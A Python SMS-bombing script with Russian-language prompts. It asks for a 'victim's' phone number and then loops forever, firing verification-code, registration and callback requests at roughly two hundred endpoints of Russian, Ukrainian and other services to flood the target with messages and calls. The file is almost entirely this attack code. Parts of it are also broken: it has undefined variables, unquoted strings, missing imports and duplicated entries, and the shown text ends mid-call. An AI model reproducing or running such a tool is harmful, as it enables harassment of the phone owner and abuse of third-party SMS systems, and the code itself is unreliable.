import requests, os
import logo
from termcolor import colored

os.system("clear")

print()
print(logo.banner)
print()

nomer = int(input("Введите номер жертвы : +"))

os.system("clear")

print()
print(logo.banner)
print()

print(F"OK ! Атака началась на номер : {nomer}\nЕсли хочешь остановить то просто нажми на Ctrl+z")
print()

while True:
    
    try:
        requests.post("https://eda.yandex/api/v1/user/requests_authentication_code",json={"phone_number": nomer},)
        print(1)
    except:
        pass
     
    try:
        requests.post("https://zoloto585.ru/api/bcard/reg/",json={"phone_number": nomer},)
        print(2)
    except:
        pass
     
    try:
        requests.post("https://youla.ru/web-api/auth/request_code",data={"phone": nomer},)
        print(3)
    except:
        pass
     
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": nomer},)
        print(4)
    except:
        pass
     
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": nomer},headers={"App-ID": "cabinet"},)
        print(5)
    except:
        pass
     
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create",json={"mobilephone": nomer},)
        print(6)
    except:
        pass
     
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/",data={"phone": nomer},)
        print(7)
    except:
        pass
     
    try:
        requests.post("https://b.utair.ru/api/v1/profile/",json={"phone": nomer},)
        print(8)
    except:
        pass
     
    try:
        requests.post("https://b.utair.ru/api/v1/login/",json={"login": nomer,"confirmation_type":"call_code"},)
        print(9)
    except:
        pass
     
    try: 
        requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": nomer},)
        print(10)
    except:
        pass
     
    try:
        requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": nomer},)
        print(11)
    except:
        pass
     
    try:
        requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": nomer},)
        print(12)
    except:
        pass
     
    try:
        requests.post("https://topbladebar.ru/user_account/ajax.php?do=sms_code",data={"phone": nomer},)
        print(13)
    except:
        pass
     
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": nomer},)
        print(14)
    except:
        pass
     
    try:
        requests.post("https://thehive.pro/auth/signup",json={"phone": nomer},)
        print(15)
    except:
        pass
     
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/",json={"sender": nomer},)
        print(16)
    except:
        pass
     
    try:
        requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": nomer},)
        print(17)
    except:
        pass
     
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": nomer},)
        print(18)
    except:
        pass
     
    try:
        requests.post("https://lk.tabris.ru/reg/",data={"action": "phone","phone": nomer},)
        print(19)
    except:
        pass
     
    try:
        requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": nomer},)
        print(20)
    except:
        pass
     
    try:
        requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": nomer},)
        print(21)
    except:
        pass
     
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": nomer},)
        print(22)
    except:
        pass
     
    try:
        requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": nomer},)
        print(23)
    except:
        pass
     
    try:
        requests.post("http://sushigourmet.ru/auth",data={"phone": nomer},)
        print(24)
    except:
        pass
     
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false","phone": nomer},)
        print(25)
    except:
        pass
     
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": nomer},)
        print(26)
    except:
        pass
     
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": nomer},)
        print(27)
    except:
        pass
     
    try:
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": nomer},)
        print(28)
    except:
        pass
     
    try:
        requests.get("https://www.sportmaster.ua/",params={"module": "users","action": "SendSMSReg","phone": nomer},)
        print(29)
    except:
        pass
     
    try:
        requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do",params={"phone": nomer},)
        print(30)
    except:
        pass
     
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": nomer,"ajax_demo_send": "1"},)
        print(31)
    except:
        pass
     
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": nomer,"action": "confirm_mobile"},)
        print(32)
    except:
        pass
     
    try:
        requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": nomer,"resend": 0},)    
        print(33)
    except:
        pass
     
    try:
        requests.post("https://sayoris.ru/?route=parse/whats",data={"phone": nomer},)
        print(34)
    except:
        pass
     
    try:
        requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": nomer},)
        print(35)
    except:
        pass
     
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": nomer,"retry": 0},)
        print(36)
    except:
        pass
     
    try:
        requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": nomer},)
        print(37)
    except:
        pass
     
    try:
        requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": nomer,"alien": "0"},)
        print(38)
    except:
        pass
     
    try:
        requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": nomer},)
        print(39)
    except:
        pass
     
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": nomer},)
        print(40)
    except:
        pass
     
    try:
        requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": nomer,"mode": "sms"},)
        print(41)
    except:
        pass
     
    try:
        requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": nomer},},)
        print(42)
    except:
        pass
     
    try:
        requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": nomer},)
        print(43)
    except:
        pass
     
    try:
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": nomer},)
        print(44)
    except:
        pass
     
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms",params={"phone": nomer},)
        print(45)
    except:
        pass
     
    try:
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","phone": nomer},)
        print(46)
    except:
        pass
     
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php",json={"phone": nomer},)
        print(47)
    except:
        pass
     
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": nomer,"method": "sendCode"},)
        print(48)
    except:
        pass
     
    try:
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": nomer},)
        print(49)
    except:
        pass
     
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": nomer,"method": "sendCode"},)
        print(50)
    except:
        pass
     
    try:
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": nomer},)
        print(51)
    except: 
        pass
     
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": nomer},)
        print(52)
    except:
        pass
     
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": nomer},)
        print(53)
    except:
        pass
     
    try:
        requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": nomer},)
        print(54)
    except:
        pass
     
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "RU","phone": nomer},)
        print(55)
    except:
        pass
     
    try:
        requests.get("https://secure.online.ua/ajax/check_phone/",params={"reg_phone": nomer},)
        print(56)
    except:
        pass
     
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": nomer},)
        print(57)
    except:
        pass
     
    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login",json={"phone": nomer},)
        print(58)
    except:
        pass
     
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": nomer,"code": "","sendsms": "Выслать код"},)
        print(59)
    except:
        pass
     
    try:
        requests.post("https://account.my.games/signup_send_sms/",data={"phone": nomer},)
        print(60)
    except:
        pass
     
    try:
        requests.post("https://auth.multiplex.ua/login",json={"login": nomer},)
        print(61)
    except:
        pass
     
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": nomer},)
        print(62)
    except:
        pass
     
    try:
        requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": nomer,"email": email},)
        print(63)
    except:
        pass
     
    try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": nomer},)
        print(64)
    except:
        pass
     
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": nomer},)
        print(65)
    except:
        pass
     
    try:
        requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": nomer, "Package": "optimal"},)
        print(66)
    except:
        pass
     
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": nomer},)
        print(67)
    except:
        pass
     
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name,"phone": nomer,"phone_number": "1"},)
        print(68)
    except:
        pass
     
    try:
        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": nomer, "do": "phone"},)
        print(69)
    except:
        pass
     
    try:
        requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": nomer},)
        print(70)
    except:
        pass
     
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": nomer, "metod": "postreg"},)
        print(71)
    except:
        pass
     
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": nomer},)
        print(72)
    except:
        pass
     
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone": nomer},)
        print(73)
    except:
        pass
     
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": nomer},)
        print(74)
    except:
        pass
     
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": nomer},)
        print(75)
    except:
        pass
     
    try:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",json={"phone": nomer},)
        print(76)
    except:
        pass
     
    try:
        requests.post("https://kilovkusa.ru/ajax.php",data={"phone": nomer},)
        print(77)
    except:
        pass
     
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": nomer},)
        print(78)
    except:
        pass
     
    try:
        requests.post("https://kaspi.kz/util/send-app-link",data={"address": nomer},)
        print(79)
    except:
        pass
     
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/",data={"phone": nomer},)
        print(80)
    except:
        pass
     
    try:
        requests.post("https://izi.ua/api/auth/sms-login",json={"phone": nomer},)
        print(81)
    except:
        pass
     
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": nomer},)
        print(82)
    except:
        pass
     
    try:
        requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": nomer},)
        print(83)
    except:
        pass
     
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": nomer, "region_code": "RU"},)
        print(84)
    except:
        pass
     
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": nomer},},)
        print(85)
    except:
        pass
     
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": nomer},)
        print(86)
    except:
        pass
     
    try:
        requests.post("https://my.dianet.com.ua/send_sms/",data={"phone": nomer},)
        print(87)
    except:
        pass
     
    try:
        requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": nomer,"type": "register"},)
        print(88)
    except:
        pass
     
    try:
        requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": nomer},)
        print(89)
    except:
        pass
     
    try:
        requests.post("https://cinema5.ru/api/phone_code",data={"phone": nomer},)
        print(90)
    except:
        pass
     
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": nomer, "type": "authenticateCode"},)
        print(91)
    except:
        pass
     
    try:
        requests.post("https://bluefin.moscow/auth/register/",data={"phone": nomer, "sendphone": "Далее"},)
        print(92)
    except:
        pass
     
    try:
        requests.post("https://app.benzuber.ru/login",data={"phone": nomer},)
        print(93)
    except:
        pass
     
    try:
        requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": nomer},)
        print(94)
    except:
        pass
     
    try:
        requests.post("https://bamper.by/registration/?step=1",data={"phone": nomer,"submit": "Запросить смс подтверждения","rules": "on"},)
        print(95)
    except:
        pass
     
    try:
        requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": nomer},)
        print(96)
    except:
        pass
     
    try:
        requests.post("https://oauth.av.ru/check-phone",json={"phone": nomer},)
        print(97)
    except:
        pass
     
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": nomer},)
        print(98)
    except:
        pass
     
    try:
        requests.post("https://belkacar.ru/get-confirmation-code",data={'phone': nomer},)
        print(99)
    except: 
        pass
     
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={'phone_number': nomer},)
        print(100)
    except:
        pass
     
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": nomer},)
        print(101)
    except:
        pass
     
    try:
        requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": nomer,"klient_email": email},)
        print(102)
    except:
        pass
     
    try:
        requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register",data={'phoneNumber': nomer,'countryCode': 'ID','name': 'name','email': 'meail@mail.com','deviceToken': '*'},)
        print(103)
    except:
        pass
    try:
        requests.post("https://apteka366.ru/login/register/sms/send",data={"phone": nomer},)
        print(104)
    except:
        pass
     
    try:
        requests.post("https://belkacar.ru/get-confirmation-code",data={"phone": nomer},)
        print(105)
    except:
        pass
        
    try:
        requests.post("https://drugvokrug.ru/siteActions/processSms.html",data={"cell": nomer},)
        print(106)
    except:
        pass
     
    try:
        requests.post("https://api.ennergiia.com/auth/api/development/lor",json={"referrer":"ennergiia","via_sms":true,"phone": nomer},)
        print(107)
    except:
        pass
     
    try:
        requests.get(F"https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={nomer}")
        print(108)
    except:
        pass
     
    try:
        requests.post("https://gorzdrav.org/login/register/sms/send",data={"phone": nomer},)
        print(109)
    except:
        pass
     
    try:
        requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register",data={"phoneNumber": nomer,"countryCode": 'ID',"name": 'Alexey',"email": 'alexey17394940gmail.com',"deviceToken": '*'},)
        print(110)
    except:
        pass
     
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",data={"phone": nomer},)
        print(111)
    except:
        pass
     
    try:
        requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode?pageName=registerPrivateUserPhoneVerification",data={"phone": nomer,"recaptcha": 'off'},)
        print(112)
    except:
        pass
     
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",json={"phone_number": nomer},)
        print(113)
    except:
        pass
     
    try:
        requests.post("https://api.tinkoff.ru/v1/sign_up",data={"phone": nomer},)
        print(114)
    except:
        pass
     
    try:
        requests.post("https://api-production.viasat.ru/api/v1/auth_codes",json={"msisdn": nomer},)
        print(115)
    except:
        pass
     
    try:
        requests.post("http://service.matreshcar.ru/profile/smstoken",json={"PhoneNumber": nomer},)
        print(116)
    except:
        pass
     
    try:
        requests.post("https://api.chef.yandex/api/v2/auth/sms",json={"phone": nomer},)
        print(117)
    except:
        pass
     
    try:
        requests.post("https://3040.com.ua/taxi-ordering",data={"callback-phone": nomer},)
        print(118)
    except:
        pass
     
    try:
        requests.post("https://alfalife.cc/auth.php",data={"phone": nomer},)
        print(119)
    except:
        pass
     
    try:
        requests.post("https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",headers={"Referer": "https://alpari.com/en/registration/"},json={"client_type": "personal","email": mail@mail.com,"mobile_phone": nomer,"deliveryOption": "sms"},)
        print(120)
    except:
        pass
     
    try:
        requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": nomer,"form[PASSWORD]": self.password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"},)
        print(121)
    except:
        pass
     
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": nomer},)
        print(122)
    except:
        pass
     
    try:
        requests.post("https://oauth.av.ru/check-phone",json={"phone": nomer},)
        print(123)
    except:
        pass
     
    try:
        requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": nomer},)
        print(124)
    except:
        pass
     
    try:
        requests.post("https://bamper.by/registration/?step=1",data={"phone": nomer,"submit": "Запросить смс подтверждения","rules": "on"},)
        print(125)
    except:
        pass
     
    try:
        requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": nomer},)
        print(126)
    except:
        pass
     
    try:
        requests.post("https://app.benzuber.ru/login",data={"phone": nomer},)
        print(127)
    except:
        pass
     
    try:
        requests.post("https://bluefin.moscow/auth/register/",data={"phone": nomer,"sendphone": "Далее"},)
        print(128)
    except:
        pass
     
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": nomer},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"},)
        print(129)
    except:
        pass
     
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": nomer,"type": "authenticateCode"},)
        print(130)
    except:
        pass
     
    try:
        requests.post("https://cinema5.ru/api/phone_code",data={"phone": nomer},)
        print(131)
    except:
        pass
     
    try:
        requests.post(F"https://www.citilink.ru/registration/confirm/phone/{nomer}/")
        print(132)
    except:
        pass
     
    try:
        requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": nomer},)
        print(133)
    except:
        pass
     
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num": nomer,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call",},)
        print(134)
    except:
        pass
     
    try:
        requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": nomer,"type": "register"},)
        print(135)
    except:
        pass
     
    try:
        requests.post("https://my.dianet.com.ua/send_sms/",data={"phone": nomer},)
        print(136)
    except:
        pass
     
    try:
        requests.post("https://api.easypay.ua/api/auth/register",json={"phone": nomer,"password": 'password'},)
        print(137)
    except:
        pass
     
    try:
        requests.post("https://e-groshi.com/online/reg",data={"first_name": 'Сергеев',"last_name": 'Александр',"third_name": 'Владиславович',"phone": nomer,"password": 'xwftl909',"password2": 'xwftl909'},)
        print(138)
    except:
        pass
     
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": nomer,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"},)
        print(139)
    except:
        pass
     
    try:
        requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone": nomer,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"},)
        print(140)
    except:
        pass
     
    try:
        requests.post("https://2407.smartomato.ru/account/session",json={"phone": nomer,"g-recaptcha-response": None,},)
        print(141)
    except:
        pass
     
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": nomer},)
        print(142)
    except:
        pass
     
    try:
        requests.get("https://findclone.ru/register",params={"phone": nomer},)
        print(143)
    except:
        pass
     
    try:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": nomer},)
        print(144)
    except:
        pass
     
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": nomer},)
        print(145)
    except:
        pass
     
    try:
        requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": nomer,"supportAllStates": True},)
        print(146)
    except:
        pass
     
    try:
        requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": nomer,"g-recaptcha-response": ""},)
        print(147)
    except:
        pass
     
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": nomer},)
        print(148)
    except:
        pass
     
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": nomer,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"},)
        print(149)
    except:
        pass
    
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": nomer},},)
        print(150)
    except:
        pass
     
    try:
        requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": '',"REGISTER[PERSONAL_PHONE]": nomer,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"},)
        print(151)
    except:
        pass
     
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": nomer,"platform": "PISWeb"},)
        print(152)
    except:
        pass
     
    try:
        requests.get("https://api.hmara.tv/stable/entrance",params={"contact": nomer},)
        print(153)
    except:
        pass
     
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": nomer,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"},)
        print(154)
    except:
        pass
     
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": nomer,"region_code": "RU"},)
        print(155)
    except:
        pass
     
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": nomer,"phone_permission": "unknown","stream_id": '0',"v": '3',"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"},)
        print(156)
    except:
        pass
     
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": 'Russia',"csrfmiddlewaretoken": "","phone": nomer},)
        print(157)
    except:
        pass
     
    try:
        requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": 'Олегович',"Gender": "M","LastName": 'Сергеев',"SecondName": 'Александр',"Phone": nomer,"Email": 'mail@mail.com'},)
        print(158)
    except:
        pass
     
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": 'xwftl909',"application": "lkp","login": nomer},)
        print(159)
    except:
        pass
     
    try:
        requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": nomer},)
        print(160)
    except:
        pass
     
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": nomer},)
        print(161)
    except:
        pass
     
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": nomer,"name": 'Сергей',"is_terms_accepted": True},)
        print(162)
    except:
        pass
     
    try:
        requests.post("https://izi.ua/api/auth/sms-login",json={"phone": nomer},)
        print(163)
    except:
        pass
     
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/",data={"phone": nomer},)
        print(164)
    except:
        pass
     
    try:
        requests.post("https://kaspi.kz/util/send-app-link",data={"address": nomer},)
        print(165)
    except:
        pass
     
    try:
        requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth","action": "send_register_sms_code","data_type": "json"},data={"phone": nomer},)
        print(166)
    except:
        pass
     
    try:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"agent": "website"},json={"phone": nomer,"type": 1},)
        print(167)
    except:
        pass
     
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": nomer},)
        print(168)
    except:
        pass
     
    try:
        requests.post("https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg",data={"phone": nomer},)
        print(169)
    except:
        pass
     
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": nomer, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"},},)
        print(170)
    except:
        pass
    
    try:
        requests.post("https://limetaxi.com.ua/dynamicframe/index.php?order=1",data={"type_mesto_1": "object2","route[0][name]": choice(["С Гуливер (пл. Спортивная 1)","ЦИРК (пл.Победы2)","АЭРОПОРТ БОРИСПОЛЬ","Метро Героев Днепра"],),"route[0][number]": "","route[0][route_address_entrance_from]": "","type_mesto_2": "","route[1][number]": "","route[1][name]": "","comment": "","user_phone": nomer,"time": "","dt": "","minibus": "false","wagon": "false","premium": "true","baggage": "false","animal": "false","conditioner": "false","courier_delivery": "false","receipt": "false","user_full_name": "widget","route_undefined": "true","add_cost": "20"},)
        print(171)
    except:
        pass
     
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone": nomer},)
        print(172)
    except:
        pass
     
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": nomer},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"},)
        print(173)
    except:
        pass
     
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": nomer,"metod": "postreg"},)
        print(174)
    except:
        pass     
     
    try:
        requests.post("https://mobileplanet.ua/register",data={"klient_name": 'Анастасия',"klient_phone": nomer,"klient_email": mail@mail.com},)
        print(175)
    except:
        pass
     
    try:
        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": nomer,"do": "phone"},)
        print(176)
    except:
        pass
     
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": nomer},)
        print(177)
    except:
        pass
     
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": nomer},)
        print(178)
    except:
        pass
     
    try:
        requests.get(F"http://mnogomenu.ru/office/password/reset/{nomer}",)
        print(179)
    except:
        pass
     
    try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": 'Ксения',"phone": nomer},)
        print(180)
    except:
        pass
     
    try:
        requests.post("https://www.moyo.ua/identity/registration",data={"firstname": ' Сергей',"phone": nomer,"email": mail@mail.com},)
        print(181)
    except:
        pass
     
    try:
        requests.post("https://zoopt.ru/api/",data={"module": "salin.core","class": r"BonusServer\Auth","action": "SendSms","phone": nomer},)
        print(182)
    except:
        pass
     
    try:
        requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": nomer},)
        print(183)
    except:
        pass
     
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": nomer,"type": 2},)
        print(184)
    except:
        pass
     
    try:
        requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": nomer},)
        print(185)
    except:
        pass
     
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": xwftl909,"phone_number": nomer,"username": tjuhgf434567},)
        print(186)
    except:
        pass
     
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": nomer},)
        print(187)
    except:
        pass
     
    try:
        requests.post("https://auth.multiplex.ua/login",json={"login": nomer},)
        print(188)
    except:
        pass
     
    try:
        requests.post("https://account.my.games/signup_send_sms/",data={"phone": nomer},)
        print(189)
    except:
        pass
     
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": nomer,"code": "","sendsms": "Выслать код"},)
        print(190)
    except:
        pass
     
    try:
        requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": nomer,"registration": "N"},)
        print(191)
    except:
        pass
     
    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login",json={"phone": nomer},)
        print(192)
    except:
        pass
     
    try:
        requests.post("https://www.oldi.ru/ajax/reg.php",data={"method": "isUserPhone","phone": nomer},)
        print(193)
    except:
        pass
     
    try:
        requests.get("https://secure.online.ua/ajax/check_phone/",params={"reg_phone": nomer},)
        print(194)
    except:
        pass
     
    try:
        requests.post("https://panda99.ru/bdhandlers/order.php",data={"CB_NAME": Александр,"CB_PHONE": nomer},)
        print(195)
    except:
        pass
     
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": nomer},)
        print(196)
    except:
        pass
     
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": nomer},)
